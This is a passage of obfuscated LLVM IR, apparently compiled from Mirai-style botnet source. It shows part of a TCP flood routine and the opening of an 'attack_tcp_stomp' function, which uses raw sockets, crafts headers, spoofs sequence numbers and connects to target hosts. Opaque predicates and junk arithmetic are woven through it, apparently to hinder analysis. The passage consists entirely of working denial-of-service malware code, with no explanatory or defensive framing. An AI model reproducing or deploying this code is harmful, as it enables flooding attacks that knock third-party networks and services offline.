  %712 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %711, i32 0, i32 1
  %713 = load i32, i32* %712, align 4
  %714 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %715 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %714, i32 0, i32 9
  store i32 %713, i32* %715, align 4
  %716 = load i16, i16* %26, align 2
  %717 = call zeroext i16 @htons(i16 zeroext %716) #7
  %718 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %719 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %718, i32 0, i32 0
  store i16 %717, i16* %719, align 4
  %720 = load i16, i16* %27, align 2
  %721 = call zeroext i16 @htons(i16 zeroext %720) #7
  %722 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %723 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %722, i32 0, i32 1
  store i16 %721, i16* %723, align 2
  %724 = load i32, i32* %28, align 4
  %725 = trunc i32 %724 to i16
  %726 = call zeroext i16 @htons(i16 zeroext %725) #7
  %727 = zext i16 %726 to i32
  %728 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %729 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %728, i32 0, i32 2
  store i32 %727, i32* %729, align 4
  %730 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %731 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %730, i32 0, i32 4
  %732 = load i16, i16* %731, align 4
  %_8 = sub i16 0, %732
  %gen9 = add i16 %_8, -241
  %_10 = sub i16 %732, -241
  %gen11 = mul i16 %_10, -241
  %_12 = sub i16 %732, -241
  %gen13 = mul i16 %_12, -241
  %_14 = sub i16 0, %732
  %gen15 = add i16 %_14, -241
  %_16 = shl i16 %732, -241
  %_17 = sub i16 0, %732
  %gen18 = add i16 %_17, -241
  %_19 = sub i16 0, %732
  %gen20 = add i16 %_19, -241
  %733 = and i16 %732, -241
  %_21 = sub i16 %733, 80
  %gen22 = mul i16 %_21, 80
  %_23 = shl i16 %733, 80
  %_24 = sub i16 %733, 80
  %gen25 = mul i16 %_24, 80
  %_26 = sub i16 %733, 80
  %gen27 = mul i16 %_26, 80
  %734 = or i16 %733, 80
  store i16 %734, i16* %731, align 4
  %735 = load i8, i8* %30, align 1
  %736 = sext i8 %735 to i16
  %737 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %738 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %737, i32 0, i32 4
  %739 = load i16, i16* %738, align 4
  %_28 = sub i16 0, %736
  %gen29 = add i16 %_28, 1
  %740 = and i16 %736, 1
  %_30 = shl i16 %740, 13
  %_31 = sub i16 0, %740
  %gen32 = add i16 %_31, 13
  %_33 = sub i16 %740, 13
  %gen34 = mul i16 %_33, 13
  %_35 = sub i16 %740, 13
  %gen36 = mul i16 %_35, 13
  %_37 = sub i16 0, %740
  %gen38 = add i16 %_37, 13
  %_39 = sub i16 %740, 13
  %gen40 = mul i16 %_39, 13
  %741 = shl i16 %740, 13
  %_41 = sub i16 0, %739
  %gen42 = add i16 %_41, -8193
  %_43 = sub i16 0, %739
  %gen44 = add i16 %_43, -8193
  %742 = and i16 %739, -8193
  %_45 = sub i16 %742, %741
  %gen46 = mul i16 %_45, %741
  %_47 = shl i16 %742, %741
  %_48 = sub i16 0, %742
  %gen49 = add i16 %_48, %741
  %_50 = sub i16 0, %742
  %gen51 = add i16 %_50, %741
  %_52 = sub i16 %742, %741
  %gen53 = mul i16 %_52, %741
  %_54 = shl i16 %742, %741
  %_55 = sub i16 %742, %741
  %gen56 = mul i16 %_55, %741
  %_57 = sub i16 0, %742
  %gen58 = add i16 %_57, %741
  %_59 = shl i16 %742, %741
  %743 = or i16 %742, %741
  store i16 %743, i16* %738, align 4
  %744 = load i8, i8* %31, align 1
  %745 = sext i8 %744 to i16
  %746 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %747 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %746, i32 0, i32 4
  %748 = load i16, i16* %747, align 4
  %_60 = shl i16 %745, 1
  %_61 = shl i16 %745, 1
  %_62 = sub i16 0, %745
  %gen63 = add i16 %_62, 1
  %_64 = sub i16 %745, 1
  %gen65 = mul i16 %_64, 1
  %_66 = sub i16 %745, 1
  %gen67 = mul i16 %_66, 1
  %_68 = sub i16 0, %745
  %gen69 = add i16 %_68, 1
  %_70 = shl i16 %745, 1
  %749 = and i16 %745, 1
  %_71 = sub i16 %749, 12
  %gen72 = mul i16 %_71, 12
  %_73 = sub i16 %749, 12
  %gen74 = mul i16 %_73, 12
  %_75 = shl i16 %749, 12
  %_76 = sub i16 %749, 12
  %gen77 = mul i16 %_76, 12
  %_78 = sub i16 %749, 12
  %gen79 = mul i16 %_78, 12
  %_80 = shl i16 %749, 12
  %750 = shl i16 %749, 12
  %_81 = sub i16 %748, -4097
  %gen82 = mul i16 %_81, -4097
  %_83 = shl i16 %748, -4097
  %_84 = shl i16 %748, -4097
  %_85 = sub i16 %748, -4097
  %gen86 = mul i16 %_85, -4097
  %_87 = shl i16 %748, -4097
  %_88 = shl i16 %748, -4097
  %751 = and i16 %748, -4097
  %_89 = sub i16 %751, %750
  %gen90 = mul i16 %_89, %750
  %_91 = sub i16 %751, %750
  %gen92 = mul i16 %_91, %750
  %_93 = sub i16 %751, %750
  %gen94 = mul i16 %_93, %750
  %_95 = sub i16 0, %751
  %gen96 = add i16 %_95, %750
  %_97 = sub i16 %751, %750
  %gen98 = mul i16 %_97, %750
  %_99 = shl i16 %751, %750
  %752 = or i16 %751, %750
  store i16 %752, i16* %747, align 4
  %753 = load i8, i8* %32, align 1
  %754 = sext i8 %753 to i16
  %755 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %756 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %755, i32 0, i32 4
  %757 = load i16, i16* %756, align 4
  %_100 = sub i16 0, %754
  %gen101 = add i16 %_100, 1
  %_102 = sub i16 0, %754
  %gen103 = add i16 %_102, 1
  %_104 = shl i16 %754, 1
  %_105 = sub i16 %754, 1
  %gen106 = mul i16 %_105, 1
  %_107 = sub i16 %754, 1
  %gen108 = mul i16 %_107, 1
  %_109 = shl i16 %754, 1
  %758 = and i16 %754, 1
  %_110 = sub i16 %758, 11
  %gen111 = mul i16 %_110, 11
  %_112 = sub i16 0, %758
  %gen113 = add i16 %_112, 11
  %_114 = shl i16 %758, 11
  %759 = shl i16 %758, 11
  %_115 = sub i16 0, %757
  %gen116 = add i16 %_115, -2049
  %_117 = sub i16 0, %757
  %gen118 = add i16 %_117, -2049
  %_119 = shl i16 %757, -2049
  %_120 = sub i16 0, %757
  %gen121 = add i16 %_120, -2049
  %_122 = sub i16 %757, -2049
  %gen123 = mul i16 %_122, -2049
  %760 = and i16 %757, -2049
  %_124 = sub i16 %760, %759
  %gen125 = mul i16 %_124, %759
  %_126 = shl i16 %760, %759
  %_127 = sub i16 %760, %759
  %gen128 = mul i16 %_127, %759
  %_129 = shl i16 %760, %759
  %_130 = sub i16 %760, %759
  %gen131 = mul i16 %_130, %759
  %_132 = shl i16 %760, %759
  %761 = or i16 %760, %759
  store i16 %761, i16* %756, align 4
  %762 = load i8, i8* %33, align 1
  %763 = sext i8 %762 to i16
  %764 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %765 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %764, i32 0, i32 4
  %766 = load i16, i16* %765, align 4
  %_133 = sub i16 0, %763
  %gen134 = add i16 %_133, 1
  %_135 = sub i16 %763, 1
  %gen136 = mul i16 %_135, 1
  %_137 = shl i16 %763, 1
  %_138 = sub i16 0, %763
  %gen139 = add i16 %_138, 1
  %_140 = sub i16 0, %763
  %gen141 = add i16 %_140, 1
  %_142 = sub i16 %763, 1
  %gen143 = mul i16 %_142, 1
  %767 = and i16 %763, 1
  %_144 = shl i16 %767, 10
  %_145 = shl i16 %767, 10
  %_146 = sub i16 0, %767
  %gen147 = add i16 %_146, 10
  %_148 = sub i16 %767, 10
  %gen149 = mul i16 %_148, 10
  %_150 = shl i16 %767, 10
  %_151 = shl i16 %767, 10
  %_152 = shl i16 %767, 10
  %768 = shl i16 %767, 10
  %_153 = shl i16 %766, -1025
  %769 = and i16 %766, -1025
  %_154 = sub i16 %769, %768
  %gen155 = mul i16 %_154, %768
  %_156 = shl i16 %769, %768
  %_157 = sub i16 %769, %768
  %gen158 = mul i16 %_157, %768
  %770 = or i16 %769, %768
  store i16 %770, i16* %765, align 4
  %771 = load i8, i8* %34, align 1
  %772 = sext i8 %771 to i16
  %773 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %774 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %773, i32 0, i32 4
  %775 = load i16, i16* %774, align 4
  %_159 = sub i16 0, %772
  %gen160 = add i16 %_159, 1
  %_161 = sub i16 0, %772
  %gen162 = add i16 %_161, 1
  %_163 = sub i16 0, %772
  %gen164 = add i16 %_163, 1
  %776 = and i16 %772, 1
  %_165 = sub i16 0, %776
  %gen166 = add i16 %_165, 9
  %_167 = sub i16 0, %776
  %gen168 = add i16 %_167, 9
  %_169 = shl i16 %776, 9
  %_170 = sub i16 0, %776
  %gen171 = add i16 %_170, 9
  %777 = shl i16 %776, 9
  %_172 = shl i16 %775, -513
  %_173 = sub i16 %775, -513
  %gen174 = mul i16 %_173, -513
  %778 = and i16 %775, -513
  %_175 = sub i16 0, %778
  %gen176 = add i16 %_175, %777
  %_177 = sub i16 %778, %777
  %gen178 = mul i16 %_177, %777
  %_179 = sub i16 0, %778
  %gen180 = add i16 %_179, %777
  %_181 = sub i16 0, %778
  %gen182 = add i16 %_181, %777
  %779 = or i16 %778, %777
  store i16 %779, i16* %774, align 4
  %780 = load i8, i8* %35, align 1
  %781 = sext i8 %780 to i16
  %782 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %783 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %782, i32 0, i32 4
  %784 = load i16, i16* %783, align 4
  %785 = and i16 %781, 1
  %_183 = shl i16 %785, 8
  %_184 = sub i16 0, %785
  %gen185 = add i16 %_184, 8
  %_186 = sub i16 %785, 8
  %gen187 = mul i16 %_186, 8
  %_188 = sub i16 %785, 8
  %gen189 = mul i16 %_188, 8
  %_190 = shl i16 %785, 8
  %_191 = sub i16 %785, 8
  %gen192 = mul i16 %_191, 8
  %_193 = sub i16 %785, 8
  %gen194 = mul i16 %_193, 8
  %_195 = sub i16 0, %785
  %gen196 = add i16 %_195, 8
  %786 = shl i16 %785, 8
  %_197 = sub i16 %784, -257
  %gen198 = mul i16 %_197, -257
  %_199 = sub i16 %784, -257
  %gen200 = mul i16 %_199, -257
  %_201 = sub i16 0, %784
  %gen202 = add i16 %_201, -257
  %_203 = sub i16 %784, -257
  %gen204 = mul i16 %_203, -257
  %_205 = sub i16 0, %784
  %gen206 = add i16 %_205, -257
  %787 = and i16 %784, -257
  %_207 = shl i16 %787, %786
  %_208 = sub i16 %787, %786
  %gen209 = mul i16 %_208, %786
  %_210 = sub i16 0, %787
  %gen211 = add i16 %_210, %786
  %_212 = shl i16 %787, %786
  %_213 = sub i16 0, %787
  %gen214 = add i16 %_213, %786
  %788 = or i16 %787, %786
  store i16 %788, i16* %783, align 4
  %789 = call i32 @rand_next()
  %_215 = shl i32 %789, 65535
  %_216 = sub i32 %789, 65535
  %gen217 = mul i32 %_216, 65535
  %_218 = sub i32 %789, 65535
  %gen219 = mul i32 %_218, 65535
  %_220 = sub i32 %789, 65535
  %gen221 = mul i32 %_220, 65535
  %_222 = shl i32 %789, 65535
  %790 = and i32 %789, 65535
  %791 = trunc i32 %790 to i16
  %792 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %793 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %792, i32 0, i32 5
  store i16 %791, i16* %793, align 2
  %794 = load i8, i8* %32, align 1
  %795 = icmp ne i8 %794, 0
  br label %originalBB7

originalBB226alteredBB:                           ; preds = %originalBB226, %330
  %796 = load i8*, i8** %42, align 8
  %797 = load i32, i32* %36, align 4
  call void @rand_alpha_str(i8* %796, i32 %797)
  %798 = load i8*, i8** %42, align 8
  %799 = load i32, i32* %36, align 4
  %800 = sext i32 %799 to i64
  %801 = getelementptr inbounds i8, i8* %798, i64 %800
  store i8 0, i8* %801, align 1
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %353
  %802 = load i32, i32* %19, align 4
  %_231 = sub i32 0, %802
  %gen232 = add i32 %_231, 1
  %_233 = sub i32 %802, 1
  %gen234 = mul i32 %_233, 1
  %803 = add nsw i32 %802, 1
  store i32 %803, i32* %19, align 4
  br label %originalBB230

originalBB238alteredBB:                           ; preds = %originalBB238, %449
  %804 = load i16, i16* %27, align 2
  %805 = zext i16 %804 to i32
  %806 = icmp eq i32 %805, 65535
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %478
  %807 = call i32 @rand_next()
  %808 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %809 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %808, i32 0, i32 2
  store i32 %807, i32* %809, align 4
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %508
  %810 = load i8*, i8** %46, align 8
  %811 = load i32, i32* %36, align 4
  call void @rand_alpha_str(i8* %810, i32 %811)
  %812 = load i8*, i8** %46, align 8
  %813 = load i32, i32* %36, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds i8, i8* %812, i64 %814
  store i8 0, i8* %815, align 1
  br label %originalBB246
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_stomp_data*, align 8
  %14 = alloca i8**, align 8
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  %19 = alloca i16, align 2
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.sockaddr_in, align 4
  %31 = alloca %struct.sockaddr_in, align 4
  %32 = alloca i32, align 4
  %33 = alloca [256 x i8], align 16
  %34 = alloca i64, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %36 = alloca i32, align 4
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %38 = alloca %struct.tcphdr*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.tcphdr*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %struct.iphdr*, align 8
  %44 = alloca %struct.tcphdr*, align 8
  %45 = alloca i8*, align 8
  %46 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %47 = load i8, i8* %7, align 1
  %48 = zext i8 %47 to i64
  %49 = call noalias i8* @calloc(i64 %48, i64 16) #6
  %50 = bitcast i8* %49 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %50, %struct.attack_stomp_data** %13, align 8
  %51 = load i8, i8* %7, align 1
  %52 = zext i8 %51 to i64
  %53 = call noalias i8* @calloc(i64 %52, i64 8) #6
  %54 = bitcast i8* %53 to i8**
  store i8** %54, i8*** %14, align 8
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 2, i32 0)
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %15, align 1
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 3, i32 65535)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %16, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 4, i32 64)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %17, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 5, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %18, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 7, i32 65535)
  %74 = trunc i32 %73 to i16
  store i16 %74, i16* %19, align 2
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 10, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %20, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 11, i32 1)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %21, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 12, i32 1)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %22, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 13, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %23, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 14, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %24, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 15, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %25, align 1
  %99 = load i8, i8* %9, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 0, i32 768)
  store i32 %101, i32* %26, align 4
  %102 = load i8, i8* %9, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %104 = call i32 @attack_get_opt_int(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 1, i32 1)
  %105 = trunc i32 %104 to i8
  store i8 %105, i8* %27, align 1
  %106 = call i64 @time(i64* null) #6
  %107 = load i32, i32* %6, align 4
  %108 = sext i32 %107 to i64
  %109 = add nsw i64 %106, %108
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %28, align 4
  %111 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %111, i32* %12, align 4
  %112 = icmp eq i32 %111, -1
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %5
  br label %917

; <label>:114:                                    ; preds = %5
  %115 = load i32, i32* @x.25
  %116 = load i32, i32* @y.26
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %114
  store i32 1, i32* %11, align 4
  %123 = load i32, i32* %12, align 4
  %124 = bitcast i32* %11 to i8*
  %125 = call i32 @setsockopt(i32 %123, i32 0, i32 3, i8* %124, i32 4) #6
  %126 = icmp eq i32 %125, -1
  %127 = load i32, i32* @x.25
  %128 = load i32, i32* @y.26
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %126, label %135, label %138

; <label>:135:                                    ; preds = %originalBBpart2
  %136 = load i32, i32* %12, align 4
  %137 = call i32 @close(i32 %136)
  br label %917

; <label>:138:                                    ; preds = %originalBBpart2
  store i32 0, i32* %11, align 4
  br label %139

; <label>:139:                                    ; preds = %originalBBpart2345, %138
  %140 = load i32, i32* @x.25
  %141 = load i32, i32* @y.26
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %139
  %148 = load i32, i32* %11, align 4
  %149 = load i8, i8* %7, align 1
  %150 = zext i8 %149 to i32
  %151 = icmp slt i32 %148, %150
  %152 = load i32, i32* @x.25
  %153 = load i32, i32* @y.26
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %151, label %160, label %731

; <label>:160:                                    ; preds = %originalBBpart24
  store i32 0, i32* %29, align 4
  br label %161

; <label>:161:                                    ; preds = %originalBBpart2337, %648, %160
  %162 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %162, i32* %29, align 4
  %163 = icmp eq i32 %162, -1
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %161
  br label %712

; <label>:165:                                    ; preds = %161
  %166 = load i32, i32* %29, align 4
  %167 = load i32, i32* %29, align 4
  %168 = call i32 (i32, i32, ...) @fcntl(i32 %167, i32 3, i32 0)
  %169 = or i32 %168, 2048
  %170 = call i32 (i32, i32, ...) @fcntl(i32 %166, i32 4, i32 %169)
  %171 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 0
  store i16 2, i16* %171, align 4
  %172 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 2
  %177 = load i8, i8* %176, align 4
  %178 = zext i8 %177 to i32
  %179 = icmp slt i32 %178, 32
  br i1 %179, label %180, label %201

; <label>:180:                                    ; preds = %165
  %181 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %182 = load i32, i32* %11, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 1
  %186 = load i32, i32* %185, align 4
  %187 = call i32 @ntohl(i32 %186) #7
  %188 = call i32 @rand_next()
  %189 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %190 = load i32, i32* %11, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i32 0, i32 2
  %194 = load i8, i8* %193, align 4
  %195 = zext i8 %194 to i32
  %196 = lshr i32 %188, %195
  %197 = add i32 %187, %196
  %198 = call i32 @htonl(i32 %197) #7
  %199 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %200 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %199, i32 0, i32 0
  store i32 %198, i32* %200, align 4
  br label %210

; <label>:201:                                    ; preds = %165
  %202 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %203 = load i32, i32* %11, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i64 %204
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i32 0, i32 1
  %207 = load i32, i32* %206, align 4
  %208 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %209 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %208, i32 0, i32 0
  store i32 %207, i32* %209, align 4
  br label %210

; <label>:210:                                    ; preds = %201, %180
  %211 = load i16, i16* %19, align 2
  %212 = zext i16 %211 to i32
  %213 = icmp eq i32 %212, 65535
  br i1 %213, label %214, label %219

; <label>:214:                                    ; preds = %210
  %215 = call i32 @rand_next()
  %216 = and i32 %215, 65535
  %217 = trunc i32 %216 to i16
  %218 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %217, i16* %218, align 2
  br label %223

; <label>:219:                                    ; preds = %210
  %220 = load i16, i16* %19, align 2
  %221 = call zeroext i16 @htons(i16 zeroext %220) #7
  %222 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %221, i16* %222, align 2
  br label %223

; <label>:223:                                    ; preds = %219, %214
  %224 = load i32, i32* @x.25
  %225 = load i32, i32* @y.26
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %223
  %232 = load i32, i32* %29, align 4
  %233 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %234 = bitcast %struct.sockaddr_in* %30 to %struct.sockaddr*
  store %struct.sockaddr* %234, %struct.sockaddr** %233, align 8
  %235 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %236 = load %struct.sockaddr*, %struct.sockaddr** %235, align 8
  %237 = call i32 @connect(i32 %232, %struct.sockaddr* %236, i32 16)
  %238 = call i64 @time(i64* null) #6
  store i64 %238, i64* %34, align 8
  %239 = load i32, i32* @x.25
  %240 = load i32, i32* @y.26
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %247

; <label>:247:                                    ; preds = %710, %originalBBpart28
  %248 = load i32, i32* @x.25
  %249 = load i32, i32* @y.26
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %247
  store i32 0, i32* %36, align 4
  store i32 16, i32* %32, align 4
  %256 = load i32, i32* %12, align 4
  %257 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %258 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %259 = bitcast %struct.sockaddr_in* %31 to %struct.sockaddr*
  store %struct.sockaddr* %259, %struct.sockaddr** %258, align 8
  %260 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %261 = load %struct.sockaddr*, %struct.sockaddr** %260, align 8
  %262 = call i64 @recvfrom(i32 %256, i8* %257, i64 256, i32 16384, %struct.sockaddr* %261, i32* %32)
  %263 = trunc i64 %262 to i32
  store i32 %263, i32* %36, align 4
  %264 = load i32, i32* %36, align 4
  %265 = icmp eq i32 %264, -1
  %266 = load i32, i32* @x.25
  %267 = load i32, i32* @y.26
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %265, label %274, label %275

; <label>:274:                                    ; preds = %originalBBpart212
  br label %917

; <label>:275:                                    ; preds = %originalBBpart212
  %276 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %31, i32 0, i32 2
  %277 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %276, i32 0, i32 0
